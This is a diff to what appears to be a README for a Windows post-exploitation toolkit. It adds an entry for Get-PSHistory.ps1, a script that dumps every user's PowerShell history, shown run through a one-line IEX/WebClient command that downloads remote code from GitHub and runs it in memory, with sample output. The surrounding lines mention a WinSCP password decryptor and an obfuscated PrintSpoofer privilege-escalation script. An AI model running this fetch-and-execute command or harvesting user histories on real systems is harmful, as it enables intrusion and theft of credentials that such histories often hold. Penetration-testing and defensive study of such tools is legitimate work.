@@ -64,6 +64,21 @@ apt-kali :: ~ » python3 WinSCPDec.py --host=127.0.0.1 --user=root --pass=A35C74
 
 ---
 
+# Get-PSHistory.ps1
+Simple script to loop through all users and print their Powershell History.
+```powershell
+PS C:\Users\void> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/0xPThree/Windows-Harvesting/refs/heads/main/Get-PSHistory.ps1')
+[*] Getting PS History for all users.
+[+] PowerShell Console History For All Users!
+[+] Computer Name: THIS-IS-MY-HOSTNAME
+[+] Users On Machine:
+    Administrator
+...
+```
+
+
+---
+
 # obf_ps.ps1
 Obfuscated PrintSpoofer script.
 ```powershell
